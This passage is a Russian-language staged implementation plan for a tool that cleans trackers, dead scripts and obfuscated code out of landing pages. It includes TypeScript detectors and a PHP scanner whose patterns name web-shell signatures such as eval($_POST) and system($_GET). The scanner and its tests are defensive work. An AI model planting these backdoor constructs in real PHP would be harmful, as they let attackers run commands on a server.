        ? decodeURIComponent(entry.url.slice(baseUrl.length + 1))
        : null;

      return { url: entry.url, relPath, totalChars, coveredChars, percent };
    });
  } finally {
    await page?.close().catch(() => {});
    await browser?.close().catch(() => {});
    close();
  }
}
```

**Что НЕ делать:**
- Не кликать по `<a href="...">` без preventDefault — страница уйдёт с лендинга.
- Не ждать дольше 30 секунд на `networkidle` — некоторые лендинги держат открытые соединения.
- Не забыть закрыть сервер в `finally` — порт останется занятым.

### 5.3 `coverage/analyze-coverage.ts`

```typescript
import * as path from 'node:path';
import * as fs from 'node:fs';
import type { Program } from 'acorn';
import { parseJs } from '../ast/parse.js';
import * as walk from 'acorn-walk';

export interface DeadFileAnalysis {
  relPath: string;
  coveragePercent: number;
  hasEventHandlers: boolean;
  isDead: boolean;
  reason: string;
}

/** Проверяет: содержит ли файл регистрацию event-handlers */
function hasEventHandlers(ast: Program): boolean {
  let found = false;
  walk.simple(ast, {
    CallExpression(node: any) {
      if (
        node.callee?.property?.name === 'addEventListener' ||
        node.callee?.name === 'jQuery' ||
        node.callee?.name === '$' // jQuery короткий вариант
      ) {
        found = true;
      }
    },
    AssignmentExpression(node: any) {
      // window.onload = ..., document.onclick = ...
      if (
        node.left?.type === 'MemberExpression' &&
        /^on[a-z]+$/.test(node.left.property?.name ?? '')
      ) {
        found = true;
      }
    },
  });
  return found;
}

export function analyzeDeadFiles(
  coverages: Array<{ relPath: string | null; percent: number }>,
  siteDir: string,
  deadThresholdPercent = 1,
): DeadFileAnalysis[] {
  const results: DeadFileAnalysis[] = [];

  for (const cov of coverages) {
    if (!cov.relPath) continue; // пропускаем inline-скрипты
    if (cov.percent > deadThresholdPercent) continue; // достаточно живой

    const absPath = path.join(siteDir, cov.relPath);
    if (!fs.existsSync(absPath)) continue;

    const source = fs.readFileSync(absPath, 'utf8');
    const ast = parseJs(source, cov.relPath);

    const hasHandlers = ast ? hasEventHandlers(ast) : false;

    if (hasHandlers) {
      results.push({
        relPath: cov.relPath,
        coveragePercent: cov.percent,
        hasEventHandlers: true,
        isDead: false,
        reason: 'Содержит event handlers — возможно lazy-инициализация',
      });
    } else {
      results.push({
        relPath: cov.relPath,
        coveragePercent: cov.percent,
        hasEventHandlers: false,
        isDead: true,
        reason: `0% покрытия, нет event handlers — мёртвый код`,
      });
    }
  }

  return results;
}
```

### 5.4 Интеграция в `cleanSite()`

```typescript
// В pipeline.ts, в конце cleanSite() перед return stats:
if (options?.runCoverage) {
  const coverages = await collectCoverage(siteDir);
  const deadFiles = analyzeDeadFiles(coverages, siteDir);

  for (const file of deadFiles) {
    if (!file.isDead) continue;
    const absPath = path.join(siteDir, file.relPath);
    await rm(absPath, { force: true });
    stats.deadJsFilesRemoved++;
    changelog.push({
      file: file.relPath,
      type: 'DEAD_JS_FILE',
      description: file.reason,
    });
    // TODO: этап 5b — также удалить <script src="..."> из HTML
  }
}
```

Обновить `CleanSiteOptions`:
```typescript
export interface CleanSiteOptions {
  /** Запустить Playwright coverage analysis для обнаружения мёртвого JS */
  runCoverage?: boolean;
  /** Порог покрытия ниже которого файл считается мёртвым (по умолчанию 1%) */
  deadCoverageThreshold?: number;
}
```

### 5.5 Acceptance criteria

- [ ] `collectCoverage` возвращает ненулевой список для тестового лендинга.
- [ ] Файл, подключённый через `<script src>` но ни разу не выполнившийся → `isDead: true`.
- [ ] Файл с `document.addEventListener('click', ...)` → `isDead: false` (защита).
- [ ] Сервер корректно закрывается даже при ошибке.

---

## Этап 6 — Partial useful extractor

### Цель
Если JS-файл **частично** полезен (содержит 1 нужную функцию и 5 ненужных),
вырезать ненужное, оставить нужное.

### ⚠️ Важное предупреждение
Это самый сложный этап. Полноценный call-graph для любого JS-кода — это задача
компилятора. Мы делаем **консервативный** вариант:
- Удаляем функции которые **только** делают exfil (сеть на внешние хосты, трекер-глобалы)
- **НЕ** пытаемся анализировать цепочки вызовов глубже 1 уровня
- Если сомневаемся — оставляем (ложный positive хуже ложного negative)

### 6.1 Что считается удаляемой функцией

Функция `X` удаляется если:
1. Тело содержит **только** exfil-вызовы (fetch/XHR/beacon/tracker-globals) + объявления переменных для них
2. **И** не содержит DOM-операций, не принимает callback-аргументы
3. **И** не экспортируется

Функция **оставляется** если:
- Содержит хотя бы один DOM-вызов (`querySelector`, `innerHTML`, etc.)
- Передаётся как callback или возвращается
- Её имя встречается в HTML в `onclick`/`onsubmit` атрибутах

### 6.2 Файл для создания

```
src/mastra/cleaners/passes/js-advanced/
└── extract-useful-functions.ts
```

Подход — используй `detectExfilCalls()` из этапа 4. Пройди по `FunctionDeclaration` и
`FunctionExpression`. Если ВСЕ вызовы внутри функции — exfil-вызовы, помечай к удалению.
Используй `magic-string` для вырезания (аналог `removeInlineExfil`).

**Минимальная реализация для старта:**
Начни с функций которые **только** вызывают трекер-глобалы:
```js
function trackEvent(e) { fbq('track', e); }
```
→ удалить.

Не трогай:
```js
function trackAndSubmit(e) { fbq('track', e); submitForm(); }
```
→ смешанная логика, оставить.

### 6.3 Acceptance criteria

- [ ] `function trackPageView() { fbq('track', 'PageView'); }` — удалена.
- [ ] `function initSlider() { ... fbq('track', 'View'); swiper.init(); }` — не тронута.
- [ ] Тесты на оба кейса.

---

## Этап 7 — Advanced detectors

### Цель
Добавить детекторы для угроз, которые не покрыты предыдущими этапами.
**В этом этапе детекторы только логируют (WARN), не удаляют** — слишком высокий риск ложных срабатываний.
Кроме `detect-obfuscation.ts` — там удаляем.

### 7.1 `detectors/detect-obfuscation.ts`

Файлы с признаками обфускации — **удалять целиком** (как метрик-файлы):

Признаки (любые 2 из 3):
- Более 15% идентификаторов в формате `_0x[a-f0-9]{4,6}` или `_0x[a-f0-9]+`
- Функция формата `(function(p,a,c,k,e,d){...})(...)` — Dean Edwards packer
- Строка содержит `eval(function(` или `String['fromCharCode']` в цепочке

```typescript
export function detectObfuscation(source: string): boolean {
  const hexVarCount = (source.match(/_0x[a-f0-9]{4,8}/gi) ?? []).length;
  const totalIdentifiers = (source.match(/\b[a-zA-Z_$][a-zA-Z0-9_$]*\b/g) ?? []).length;
  if (totalIdentifiers > 0 && hexVarCount / totalIdentifiers > 0.15) return true;

  if (/eval\s*\(\s*function\s*\(p,a,c,k,e/.test(source)) return true;
  if (/String\s*\[\s*['"]fromCharCode['"]\s*\]/.test(source)) return true;

  return false;
}
```

### 7.2 `detectors/detect-keylogger.ts` (только WARN)

```typescript
/** Признак кейлоггера: addEventListener на keydown/keypress + сетевой вызов в той же функции */
export function detectKeylogger(ast: Program, source: string): DetectionResult[] {
  // Ищем addEventListener('keydown'|'keypress'|'input', function() { ... fetch/XHR ... })
  // Если внутри callback есть сетевой вызов → WARN
  // shouldRemove: false (только предупреждение)
}
```

### 7.3 `detectors/detect-redirect.ts` (только WARN)

```typescript
/** window.location = 'https://external.com' или location.replace('https://external.com') */
export function detectRedirect(ast: Program, ctx: DetectorContext): DetectionResult[] {
  // Ищем AssignmentExpression: window.location = STRING или location.href = STRING
  // CallExpression: location.replace(STRING)
  // Если STRING — внешний URL → WARN
}
```

### 7.4 `detectors/detect-document-write-script.ts` (удалять)

```typescript
/** document.write('<script src="https://external...">') */
export function detectDocWriteScript(ast: Program, ctx: DetectorContext): DetectionResult[] {
  // CallExpression: document.write(STRING) где STRING содержит '<script' и внешний URL
  // shouldRemove: true
}
```

### 7.5 PHP backdoor scanner

Создай `src/mastra/cleaners/passes/php/detect-php-backdoors.ts`:

```typescript
/** Сигнатуры PHP-шеллов и backdoor-паттернов */
const PHP_BACKDOOR_PATTERNS = [
  { re: /eval\s*\(\s*\$_(POST|GET|REQUEST|COOKIE)/i, label: 'eval($_POST/GET)' },
  { re: /assert\s*\(\s*\$_(POST|GET|REQUEST)/i, label: 'assert($_POST)' },
  { re: /system\s*\(\s*\$_(GET|POST|REQUEST)/i, label: 'system() с user input' },
  { re: /preg_replace\s*\([^,]+\/e[^,]*,/i, label: 'preg_replace /e modifier' },
  { re: /base64_decode\s*\([^)]+\)\s*;?\s*\)/i, label: 'base64_decode → eval chain' },
  { re: /gzinflate\s*\(\s*base64_decode/i, label: 'gzinflate(base64_decode(...))' },
  { re: /move_uploaded_file\s*\([^)]+\)/i, label: 'move_uploaded_file (file upload)' },
  { re: /passthru\s*\(\s*\$_(GET|POST)/i, label: 'passthru() с user input' },
];

export function detectPhpBackdoors(content: string, relPath: string): ChangelogEntry[] {
  const entries: ChangelogEntry[] = [];
  for (const { re, label } of PHP_BACKDOOR_PATTERNS) {
    if (re.test(content)) {
      entries.push({
        file: relPath,
        type: 'PHP_BACKDOOR_WARN',
        description: `ВНИМАНИЕ: обнаружен паттерн бэкдора: ${label}. ТРЕБУЕТСЯ РУЧНАЯ ПРОВЕРКА.`,
      });
    }
  }
  return entries;
}
```

**Важно:** этот детектор **не удаляет** — только логирует. Если найдены PHP-бэкдоры,
`cleanSite()` должен сохранить предупреждение и вернуть флаг `phpBackdoorWarning: true` в stats.

### 7.6 Acceptance criteria

- [ ] `_0x1234('0x1','abc')` код — детектируется как obfuscated.
- [ ] `eval(function(p,a,c,k...` — детектируется как obfuscated.
- [ ] `addEventListener('keypress', fn)` без сетевых вызовов — не детектируется.
- [ ] PHP-файл с `eval($_POST['cmd'])` — логирует WARNING.
- [ ] `npm run build` зелёный.

---

## Этап 8 — Visual diff + полная интеграция

### Цель
1. Добавить visual diff verification (скриншот до/после через pixelmatch).
2. Прокинуть CLI флаг `--advanced` в `scripts/clean-site.ts`.
3. Добавить все новые stats-поля в итоговый вывод.
4. Обновить `src/mastra/tools/clean-site-tool.ts`.
5. Обновить `docs/cleaning-logic.md`.

### 8.1 Установить pixelmatch

```bash
npm install pixelmatch pngjs
npm install -D @types/pngjs
```

### 8.2 Visual diff

Создай `src/mastra/cleaners/passes/js-advanced/verify-visual.ts`:

```typescript
import { chromium } from 'playwright';
import { PNG } from 'pngjs';
import pixelmatch from 'pixelmatch';
import { readFile } from 'node:fs/promises';

export interface VisualDiffResult {
  diffPercent: number;
  baselinePath: string;
  afterPath: string;
  diffImagePath: string;
}

export async function takeScreenshot(pageUrl: string, outputPath: string): Promise<void> {
  const browser = await chromium.launch({ headless: true });
  try {
    const page = await browser.newPage();
    await page.setViewportSize({ width: 1280, height: 800 });
    await page.goto(pageUrl, { waitUntil: 'networkidle' });
    await page.screenshot({ path: outputPath, fullPage: false });
  } finally {
    await browser.close();
  }
}

export async function compareScreenshots(
  baselinePath: string,
  afterPath: string,
  diffPath: string,
): Promise<number> {
  const [baselineBuffer, afterBuffer] = await Promise.all([
    readFile(baselinePath),
    readFile(afterPath),
  ]);
  const img1 = PNG.sync.read(baselineBuffer);
  const img2 = PNG.sync.read(afterBuffer);

  const { width, height } = img1;
  const diff = new PNG({ width, height });

  const numDiffPixels = pixelmatch(img1.data, img2.data, diff.data, width, height, {
    threshold: 0.1,
    includeAA: false,
  });

  const diffPercent = (numDiffPixels / (width * height)) * 100;
  // Сохранить diff-изображение
  // await writeFile(diffPath, PNG.sync.write(diff));
  return diffPercent;
}
```

### 8.3 CLI флаг

В `scripts/clean-site.ts` добавить поддержку `--advanced` и `--coverage`:

```typescript
const runAdvanced = process.argv.includes('--advanced');
const runCoverage = process.argv.includes('--coverage');

await cleanSite(siteDir, { runAdvanced, runCoverage });
```

### 8.4 `clean-site-tool.ts` — новые параметры

Добавь в inputSchema:
```typescript
z.object({
  siteDir: z.string(),
  backup: z.boolean().optional().default(true),
  advanced: z.boolean().optional().default(false).describe('Включить AST-анализ JS'),
  runCoverage: z.boolean().optional().default(false).describe('Playwright coverage analysis'),
})
```

### 8.5 Порядок проходов — финальная картина

```
pipeline.ts:
1. normalizeLandingStructure()       — уже есть
2. Pre-scan: detectUnversionedLib()  — этап 3
3. [walkFiles] HTML:
   - removeTrackerScripts
   - removeTrackerJsonLd
   - removeInlineTrackers
   - removeInlineExfilPass           ← НОВЫЙ (этап 4)
   - removeNoscriptTrackers
   - removeTrackerLinks
   - removeTrackerMetas
   - removeMetaRefresh
   - removeTrackerIframes
   - removeImgPixels
   - removeBase
   - removeObjectEmbed
   - removeFrames
   - replaceLocalLibsWithCdn (+ unversioned map)  ← расширен (этап 3)
   - replaceOfferLinks
   - stripEventAttrs
4. [walkFiles] JS:
   - cleanJsFile (существующий + detectMetricFile) ← этап 2
   - detectObfuscation → delete if obfuscated     ← этап 7
   - extractUsefulFunctions                        ← этап 6
5. [walkFiles] PHP:
   - detectPhpBackdoors → WARN                    ← этап 7
6. CSS: cleanCssFile                              — уже есть
7. FS: removeTrackerExternals                     — уже есть
8. FS: removeSourceMaps                           — уже есть
9. Coverage (optional):
   - collectCoverage → analyzeDeadFiles → delete  ← этап 5
10. writeChangelog                                — уже есть
```

### 8.6 Финальные acceptance criteria всего проекта

- [ ] `npm run build` зелёный.
- [ ] `npm run clean -- <dir>` — прежнее поведение, без регрессий.
- [ ] `npm run clean -- <dir> --advanced` — запускает все новые проходы.
- [ ] `npm run clean -- <dir> --advanced --coverage` — запускает + Playwright coverage.
- [ ] На 5 реальных лендингах: 0 console errors, CTA-кнопки работают.
- [ ] `clean-site-changes.log` содержит новые типы записей.
- [ ] `vitest run` — все тесты зелёные.

---

## Типичные ошибки (НЕ ДЕЛАТЬ)

1. **Не удалять файл внутри async walker loop** по тому же siteDir — рекурсивный обход может
   прочитать уже удалённый файл. Сначала соберите список, потом удаляйте.

2. **Не модифицировать HTML regex** без понимания backreference — `<script>` в HTML могут
   быть вложены (техника атак). Используй уже существующие regex из `remove-inline-trackers.ts`.

3. **Не парсить HTML через `acorn`** — acorn парсит только JS. HTML-атрибут `onclick="..."` —
   это просто строка, не AST.

4. **Не игнорировать `parseJs() → null`** — некоторые файлы минифицированы настолько, что
   парсер падает. Всегда проверяй на null.

5. **Не применять хирургическое вырезание без `magic-string`** — ручные `str.replace` по позиции
   сдвинут все последующие позиции. `MagicString` умеет это правильно.

6. **Не добавлять `console.log` для дебага** и забывать удалить. Используй `log: ChangelogEntry[]`.

7. **Не хардкодить домены** (например, `if (url.includes('facebook'))`) — всегда через реестр
   `TRACKER_HOSTS` или `SUSPICIOUS_CALL_GLOBALS`.

8. **Не запускать Playwright без `finally { browser.close() }`** — процесс chromium зависнет.

---

## Как запускать тесты

```bash
# Все тесты
npx vitest run

# Только новые тесты
npx vitest run src/mastra/cleaners/passes/js-advanced

# Проверка сборки
npm run build
```

## Порядок реализации этапов

Рекомендуемый порядок: **1 → 2 → 3 → 4 → 7 → 5 → 6 → 8**.

Этапы 5 и 6 сложнее и рискованнее — реализуй их последними, когда уже есть тесты и
хорошее понимание кодовой базы. Этапы 2–4 — быстрые победы, делают заметный результат
уже на первой неделе.
